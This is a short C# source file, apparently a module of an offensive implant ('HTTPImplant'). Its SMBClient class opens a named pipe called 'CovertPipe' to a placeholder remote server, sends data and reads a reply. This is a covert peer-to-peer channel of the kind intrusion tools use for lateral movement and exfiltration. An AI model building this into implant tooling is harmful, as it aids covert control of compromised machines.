using System;
using System.IO;
using System.IO.Pipes;
using System.Threading;

namespace HTTPImplant.Modules
{
    public class SMBClient
    {
        private const string pipeName = "CovertPipe";
        private const string serverName = "<ServerMachineName>"; // Replace with the actual server machine name or IP address

        public static void SendData(string data)
        {
            try
            {
                using (NamedPipeClientStream clientPipe = new NamedPipeClientStream(serverName, pipeName, PipeDirection.InOut))
                {
                    Console.WriteLine("Connecting to server...");
                    clientPipe.Connect();

                    Console.WriteLine("Connected to server. Sending data...");

                    using (StreamWriter writer = new StreamWriter(clientPipe) { AutoFlush = true })
                    using (StreamReader reader = new StreamReader(clientPipe))
                    {
                        // Send data to the server
                        writer.WriteLine(data);

                        // Optionally, wait for the server's response
                        string response = reader.ReadLine();
                        Console.WriteLine("Response from server: " + response);
                    }

                    clientPipe.Close();
                    return;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }
    }
}
